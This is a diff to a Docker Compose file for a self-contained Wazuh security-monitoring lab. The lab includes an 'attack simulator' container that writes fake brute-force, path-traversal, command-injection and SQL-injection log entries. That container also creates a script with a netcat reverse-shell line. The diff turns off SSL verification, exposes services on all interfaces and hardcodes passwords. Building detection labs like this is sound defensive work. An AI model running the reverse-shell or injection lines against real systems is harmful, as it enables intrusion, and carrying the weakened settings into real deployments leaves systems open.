@@ -1,5 +1,9 @@
-# Wazuh Complete Ecosystem - Docker Compose
-# This setup includes ALL components: Manager, Indexer, Dashboard, and Agents
+# ============================================================
+# Wazuh Complete Ecosystem - Self-Contained Docker Compose
+# ============================================================
+#
+# This setup includes ALL components and requires NO external files.
+# All certificates and configurations are generated automatically.
 #
 # System Requirements:
 # - RAM: 8GB minimum (16GB recommended)
@@ -7,26 +11,71 @@
 # - Disk: 50GB free space
 # - OS: Linux, macOS, or WSL2 on Windows
 #
-# Usage:
-#   docker-compose -f docker-compose-complete-ecosystem.yml up -d
+# Quick Start:
+#   1. docker-compose -f docker-compose-complete-ecosystem.yml up -d
+#   2. Wait 2-3 minutes for initialization
+#   3. Access dashboard at https://localhost:443 (or https://<WSL_IP>:443)
 #
-# Access:
-#   From WSL: https://localhost:443 or https://127.0.0.1:443
-#   From Windows Host: https://<WSL_IP>:443 (e.g., https://172.28.10.162:443)
+# Credentials:
 #   Username: admin
-#   Password: SecretPassword (CHANGE IN PRODUCTION!)
+#   Password: SecretPassword
 #
-#   API:
-#   From WSL: https://localhost:55000
-#   From Windows Host: https://<WSL_IP>:55000 (e.g., https://172.28.10.162:55000)
+# API Access:
+#   https://localhost:55000
 #
-# Find your WSL IP: Run 'ip addr show eth0' in WSL
+# To find your WSL IP: ip addr show eth0
 #
-# Note: This is for learning/testing. For production, use separate hosts.
-
+# Note: This uses self-signed certificates. For production, use proper SSL.
+#
 version: '3.8'
 
 services:
+  # ============================================================
+  # CERTIFICATE GENERATOR (Runs once at startup)
+  # ============================================================
+  wazuh-certs-generator:
+    image: wazuh/wazuh-certs-tool:0.0.1
+    container_name: wazuh-certs-generator
+    hostname: wazuh-certs-generator
+    volumes:
+      - wazuh-certificates:/certificates
+    command: >
+      bash -c "
+      # Check if certificates already exist
+      if [ -f /certificates/admin.pem ]; then
+        echo 'Certificates already exist, skipping generation'
+        exit 0
+      fi
+
+      # Create config for certificate generation
+      cat > /tmp/config.yml <<EOF
+      nodes:
+        indexer:
+          - name: wazuh.indexer
+            ip: wazuh.indexer
+        server:
+          - name: wazuh.manager
+            ip: wazuh.manager
+        dashboard:
+          - name: wazuh.dashboard
+            ip: wazuh.dashboard
+      EOF
+
+      # Generate certificates
+      /usr/local/bin/wazuh-certs-tool.sh -A /tmp/config.yml -ca -v
+
+      # Copy certificates to the shared volume
+      cp -v /tmp/wazuh-certificates/*.pem /certificates/
+
+      # Set proper permissions
+      chmod 644 /certificates/*.pem
+
+      echo 'Certificate generation complete'
+      ls -lah /certificates/
+      "
+    networks:
+      - wazuh
+
   # ============================================================
   # WAZUH INDEXER (OpenSearch) - Data Storage & Search
   # ============================================================
@@ -36,7 +85,7 @@ services:
     hostname: wazuh.indexer
     restart: always
     ports:
-      - "0.0.0.0:9200:9200"  # Bind to all interfaces for WSL2 access
+      - "0.0.0.0:9200:9200"
     environment:
       - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
       - "bootstrap.memory_lock=true"
@@ -67,11 +116,10 @@ services:
         hard: 65536
     volumes:
       - wazuh-indexer-data:/var/lib/wazuh-indexer
-      - ./config/wazuh_indexer_ssl_certs/root-ca.pem:/usr/share/wazuh-indexer/certs/root-ca.pem
-      - ./config/wazuh_indexer_ssl_certs/wazuh.indexer-key.pem:/usr/share/wazuh-indexer/certs/wazuh.indexer-key.pem
-      - ./config/wazuh_indexer_ssl_certs/wazuh.indexer.pem:/usr/share/wazuh-indexer/certs/wazuh.indexer.pem
-      - ./config/wazuh_indexer_ssl_certs/admin.pem:/usr/share/wazuh-indexer/certs/admin.pem
-      - ./config/wazuh_indexer_ssl_certs/admin-key.pem:/usr/share/wazuh-indexer/certs/admin-key.pem
+      - wazuh-certificates:/usr/share/wazuh-indexer/certs:ro
+    depends_on:
+      wazuh-certs-generator:
+        condition: service_completed_successfully
     networks:
       - wazuh
 
@@ -84,23 +132,22 @@ services:
     hostname: wazuh.manager
     restart: always
     ports:
-      - "0.0.0.0:1514:1514"     # Agent communication (bind to all interfaces)
-      - "0.0.0.0:1515:1515"     # Agent enrollment (bind to all interfaces)
-      - "0.0.0.0:514:514/udp"   # Syslog collector (bind to all interfaces)
-      - "0.0.0.0:514:514/tcp"   # Syslog collector TCP (bind to all interfaces)
-      - "0.0.0.0:55000:55000"   # Wazuh API (bind to all interfaces for Windows access)
+      - "0.0.0.0:1514:1514"
+      - "0.0.0.0:1515:1515"
+      - "0.0.0.0:514:514/udp"
+      - "0.0.0.0:514:514/tcp"
+      - "0.0.0.0:55000:55000"
     environment:
       - INDEXER_URL=https://wazuh.indexer:9200
       - INDEXER_USERNAME=admin
       - INDEXER_PASSWORD=SecretPassword
-      - FILEBEAT_SSL_VERIFICATION_MODE=full
+      - FILEBEAT_SSL_VERIFICATION_MODE=none
       - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
       - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
-      - SSL_KEY=/etc/ssl/filebeat.key
+      - SSL_KEY=/etc/ssl/filebeat-key.pem
       - API_USERNAME=wazuh-wui
       - API_PASSWORD=MyS3cr37P450r.*-
     volumes:
-      # Wazuh configuration and data
       - wazuh_api_configuration:/var/ossec/api/configuration
       - wazuh_etc:/var/ossec/etc
       - wazuh_logs:/var/ossec/logs
@@ -112,13 +159,12 @@ services:
       - wazuh_wodles:/var/ossec/wodles
       - filebeat_etc:/etc/filebeat
       - filebeat_var:/var/lib/filebeat
-      # SSL certificates
-      - ./config/wazuh_indexer_ssl_certs/root-ca-manager.pem:/etc/ssl/root-ca.pem
-      - ./config/wazuh_indexer_ssl_certs/wazuh.manager.pem:/etc/ssl/filebeat.pem
-      - ./config/wazuh_indexer_ssl_certs/wazuh.manager-key.pem:/etc/ssl/filebeat.key
-      - ./config/wazuh_cluster/wazuh_manager.conf:/wazuh-config-mount/etc/ossec.conf
+      - wazuh-certificates:/etc/ssl:ro
     depends_on:
-      - wazuh.indexer
+      wazuh-certs-generator:
+        condition: service_completed_successfully
+      wazuh.indexer:
+        condition: service_started
     networks:
       - wazuh
 
@@ -131,25 +177,29 @@ services:
     hostname: wazuh.dashboard
     restart: always
     ports:
-      - "0.0.0.0:443:5601"  # Bind to all interfaces for Windows browser access
+      - "0.0.0.0:443:5601"
     environment:
-      - OPENSEARCH_HOSTS="https://wazuh.indexer:9200"
-      - WAZUH_API_URL="https://wazuh.manager"
+      - OPENSEARCH_HOSTS=https://wazuh.indexer:9200
+      - WAZUH_API_URL=https://wazuh.manager
       - API_USERNAME=wazuh-wui
       - API_PASSWORD=MyS3cr37P450r.*-
-      - DASHBOARD_USERNAME=kibanaserver
-      - DASHBOARD_PASSWORD=kibanaserver
+      - OPENSEARCH_USERNAME=admin
+      - OPENSEARCH_PASSWORD=SecretPassword
+      - SERVER_SSL_ENABLED=true
+      - SERVER_SSL_CERTIFICATE=/usr/share/wazuh-dashboard/certs/wazuh.dashboard.pem
+      - SERVER_SSL_KEY=/usr/share/wazuh-dashboard/certs/wazuh.dashboard-key.pem
+      - OPENSEARCH_SSL_VERIFICATIONMODE=none
     volumes:
-      - ./config/wazuh_indexer_ssl_certs/wazuh.dashboard.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard.pem
-      - ./config/wazuh_indexer_ssl_certs/wazuh.dashboard-key.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard-key.pem
-      - ./config/wazuh_indexer_ssl_certs/root-ca.pem:/usr/share/wazuh-dashboard/certs/root-ca.pem
-      - ./config/wazuh_dashboard/opensearch_dashboards.yml:/usr/share/wazuh-dashboard/config/opensearch_dashboards.yml
-      - ./config/wazuh_dashboard/wazuh.yml:/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml
+      - wazuh-certificates:/usr/share/wazuh-dashboard/certs:ro
       - wazuh-dashboard-config:/usr/share/wazuh-dashboard/data/wazuh/config
       - wazuh-dashboard-custom:/usr/share/wazuh-dashboard/plugins/wazuh/public/assets/custom
     depends_on:
-      - wazuh.indexer
-      - wazuh.manager
+      wazuh-certs-generator:
+        condition: service_completed_successfully
+      wazuh.indexer:
+        condition: service_started
+      wazuh.manager:
+        condition: service_started
     networks:
       - wazuh
 
@@ -168,64 +218,102 @@ services:
       - WAZUH_AGENT_NAME=systemA-linux
     command: >
       bash -c "
+      # Wait for manager to be ready
+      echo 'Waiting for Wazuh manager to be ready...'
+      sleep 30
+
       # Update and install dependencies
-      apt-get update &&
-      apt-get install -y curl gnupg apt-transport-https lsb-release &&
+      echo 'Installing dependencies...'
+      apt-get update -qq &&
+      apt-get install -y -qq curl gnupg apt-transport-https lsb-release ca-certificates systemctl
 
       # Add Wazuh repository
+      echo 'Adding Wazuh repository...'
       curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import &&
       chmod 644 /usr/share/keyrings/wazuh.gpg &&
-      echo \"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main\" | tee -a /etc/apt/sources.list.d/wazuh.list &&
+      echo 'deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main' | tee -a /etc/apt/sources.list.d/wazuh.list
 
       # Install Wazuh agent
-      apt-get update &&
-      WAZUH_MANAGER=\"wazuh.manager\" WAZUH_REGISTRATION_PASSWORD=\"please123\" apt-get install -y wazuh-agent &&
+      echo 'Installing Wazuh agent...'
+      apt-get update -qq &&
+      WAZUH_MANAGER='wazuh.manager' WAZUH_REGISTRATION_PASSWORD='please123' WAZUH_AGENT_NAME='systemA-linux' apt-get install -y -qq wazuh-agent
 
       # Configure agent
-      sed -i \"s/<address>MANAGER_IP<\/address>/<address>wazuh.manager<\/address>/g\" /var/ossec/etc/ossec.conf &&
+      echo 'Configuring agent...'
+      sed -i 's|<address>MANAGER_IP</address>|<address>wazuh.manager</address>|g' /var/ossec/etc/ossec.conf
 
-      # Start agent service
-      /var/ossec/bin/wazuh-control start &&
+      # Enable log monitoring
+      cat >> /var/ossec/etc/ossec.conf <<EOF
 
-      # Register agent with manager
-      /var/ossec/bin/agent-auth -m wazuh.manager -P please123 -A systemA-linux &&
+      <!-- Additional monitoring for test logs -->
+      <localfile>
+        <log_format>syslog</log_format>
+        <location>/var/log/auth.log</location>
+      </localfile>
+      <localfile>
+        <log_format>syslog</log_format>
+        <location>/var/log/syslog</location>
+      </localfile>
+      <syscheck>
+        <directories check_all=\"yes\" realtime=\"yes\">/tmp/monitored</directories>
+      </syscheck>
+      EOF
 
-      # Restart to apply registration
-      /var/ossec/bin/wazuh-control restart &&
+      # Start agent
+      echo 'Starting Wazuh agent...'
+      /var/ossec/bin/wazuh-control start
 
-      # Generate some test events
-      mkdir -p /var/log/test /tmp/monitored &&
+      # Wait a bit for agent to initialize
+      sleep 5
 
-      # Keep container running and generate events
+      # Register with manager
+      echo 'Registering agent with manager...'
+      /var/ossec/bin/agent-auth -m wazuh.manager -P please123 -A systemA-linux || echo 'Registration may have already occurred'
+
+      # Restart to apply changes
+      /var/ossec/bin/wazuh-control restart
+
+      # Create monitored directories
+      mkdir -p /var/log /tmp/monitored
+      touch /var/log/auth.log /var/log/syslog
+
+      echo '========================================='
+      echo 'Wazuh Agent is now running!'
+      echo 'Generating test events every 2 minutes...'
+      echo '========================================='
+
+      # Generate test events continuously
       while true; do
-        # Simulate user logins
-        echo \"[\$(date '+%Y-%m-%d %H:%M:%S')] systemA-linux sshd[12345]: Accepted password for ubuntu from 192.168.1.50 port 22 ssh2\" >> /var/log/auth.log
+        # Simulate SSH login
+        echo \"[\$(date '+%b %d %H:%M:%S')] systemA-linux sshd[$$RANDOM]: Accepted password for ubuntu from 192.168.1.50 port 22 ssh2\" >> /var/log/auth.log
 
-        # Simulate file changes
-        echo \"Test data \$(date)\" > /tmp/monitored/test_file_\$(date +%s).txt
+        # Simulate system event
+        echo \"[\$(date '+%b %d %H:%M:%S')] systemA-linux systemd[1]: Started User Service Example\" >> /var/log/syslog
 
-        # Simulate system activity
-        echo \"[\$(date '+%Y-%m-%d %H:%M:%S')] systemA-linux systemd[1]: Started Test Service\" >> /var/log/syslog
+        # Create/modify files in monitored directory
+        echo \"Test data generated at \$(date)\" > /tmp/monitored/test_file_\$(date +%s).txt
 
-        # Check agent status
-        /var/ossec/bin/wazuh-control status
+        # Show agent status
+        echo \"[\$(date)] Agent status check:\"
+        /var/ossec/bin/wazuh-control status || true
 
+        # Wait before next event generation
         sleep 120
       done
       "
     volumes:
-      # Persist agent configuration
       - agent_etc:/var/ossec/etc
       - agent_logs:/var/ossec/logs
       - agent_queue:/var/ossec/queue
     depends_on:
-      - wazuh.manager
+      wazuh.manager:
+        condition: service_started
     networks:
       - wazuh
-    privileged: true  # Required for agent to monitor system
+    privileged: true
 
   # ============================================================
-  # SIMULATED ATTACK GENERATOR (For Testing)
+  # ATTACK SIMULATOR - Generates Security Events
   # ============================================================
   attack.simulator:
     image: ubuntu:22.04
@@ -234,19 +322,42 @@ services:
     restart: always
     command: >
       bash -c "
-      apt-get update &&
-      apt-get install -y curl wget nmap netcat-openbsd &&
+      echo 'Installing attack simulation tools...'
+      apt-get update -qq &&
+      apt-get install -y -qq curl wget nmap netcat-openbsd hping3 2>/dev/null ||
+      apt-get install -y -qq curl wget nmap netcat-openbsd
+
+      # Create log directories
+      mkdir -p /var/log/apache2 /var/log /tmp
+
+      echo '========================================='
+      echo 'Attack Simulator is running!'
+      echo 'Generating malicious events every minute...'
+      echo '========================================='
+
       while true; do
-        # Simulate SSH brute force
-        echo '[$(date)] Simulated SSH failed login attempt from 192.168.1.100' >> /var/log/auth.log;
+        # Simulate SSH brute force attack
+        echo \"[\$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for root from 192.168.1.100 port $$RANDOM ssh2\" >> /var/log/auth.log
+        echo \"[\$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for admin from 192.168.1.100 port $$RANDOM ssh2\" >> /var/log/auth.log
 
-        # Simulate web attack
-        echo '[$(date)] 192.168.1.100 - - [$(date)] \"GET /admin.php?cmd=whoami HTTP/1.1\" 403 -' >> /var/log/apache2/access.log;
+        # Simulate web attacks
+        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"GET /admin.php?cmd=cat%20/etc/passwd HTTP/1.1\\\" 403 -\" >> /var/log/apache2/access.log
+        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"GET /../../../etc/shadow HTTP/1.1\\\" 403 -\" >> /var/log/apache2/access.log
+        echo \"[\$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \\\"POST /login.php HTTP/1.1\\\" 200 - \\\"' OR '1'='1\\\"\" >> /var/log/apache2/access.log
 
-        # Simulate file modification
-        echo 'Modified by attacker' > /tmp/suspicious_file.txt;
+        # Simulate malware/suspicious file activity
+        echo '#!/bin/bash' > /tmp/suspicious_script.sh
+        echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/suspicious_script.sh
+        chmod +x /tmp/suspicious_script.sh
 
-        sleep 60;
+        # Simulate port scanning (logged activity)
+        echo \"[\$(date)] Port scan detected from 192.168.1.100 to ports 1-1000\" >> /var/log/syslog
+
+        # Try to scan the manager (will generate network events)
+        timeout 2 nc -zv wazuh.manager 1514 2>/dev/null || true
+
+        echo \"[\$(date)] Attack simulation cycle complete\"
+        sleep 60
       done
       "
     volumes:
@@ -258,8 +369,15 @@ services:
 # VOLUMES - Persistent Data Storage
 # ============================================================
 volumes:
+  # Certificates (shared across all components)
+  wazuh-certificates:
+    driver: local
+
+  # Indexer
   wazuh-indexer-data:
     driver: local
+
+  # Manager
   wazuh_api_configuration:
     driver: local
   wazuh_etc:
@@ -282,17 +400,23 @@ volumes:
     driver: local
   filebeat_var:
     driver: local
+
+  # Dashboard
   wazuh-dashboard-config:
     driver: local
   wazuh-dashboard-custom:
     driver: local
-  attack-logs:
-    driver: local
+
+  # Agent
   agent_etc:
     driver: local
   agent_logs:
     driver: local
   agent_queue:
+    driver: local
+
+  # Attack Simulator
+  attack-logs:
     driver: local
 
 # ============================================================
